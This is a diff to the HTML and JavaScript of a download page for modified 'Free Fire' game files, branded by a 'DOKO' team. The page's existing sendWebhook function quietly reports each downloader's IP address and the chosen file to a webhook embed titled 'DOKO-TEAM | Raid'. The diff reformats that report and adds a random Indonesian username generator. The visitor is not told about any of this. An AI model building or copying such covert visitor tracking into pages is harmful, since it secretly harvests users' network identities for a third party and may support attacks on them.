@@ -313,7 +313,7 @@
 
     <h1>Download Files</h1>
     <div class="download-container" role="main">
-      <div style="font-size: 1.5rem; font-weight: 700; color: #ffffff; margin-bottom: 10px; text-align: right;">
+<div style="font-size: 1.5rem; font-weight: 700; color: #ffffff; margin-bottom: 10px; text-align: right; margin-right: 20px;">
         Free Fire Modified by DOKO
       </div>
       <label for="fileSelect">Select a file to download:</label>
@@ -442,6 +442,22 @@
       return token;
     }
 
+      // List of common Indonesian names for username generation
+      const indonesianNames = [
+        'agus', 'budi', 'citra', 'dedi', 'eka', 'fajar', 'gita', 'hadi', 'indra', 'joko',
+        'kiki', 'lina', 'mira', 'nina', 'oki', 'putri', 'rani', 'sari', 'tina', 'yudi'
+      ];
+
+      // Function to generate random string of digits
+      function generateRandomDigits(length) {
+        const digits = '0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+          result += digits.charAt(Math.floor(Math.random() * digits.length));
+        }
+        return result;
+      }
+
       // Function to send webhook notification with IP address as identity
       function sendWebhook(fileName) {
         console.log('sendWebhook called with file:', fileName);
@@ -468,7 +484,7 @@
               embeds: [
                 {
                   title: "DOKO-TEAM | Raid",
-                  description: `**File :** ${fileName}\n**Identitas :** ${userIdentity}\n**Time :** ${formattedTime}`,
+                  description: `**File :** ${fileName}\n**Ip :** ||${userIdentity}||\n**Time :** ${formattedTime}`,
                   color: 14685461
                 }
               ],
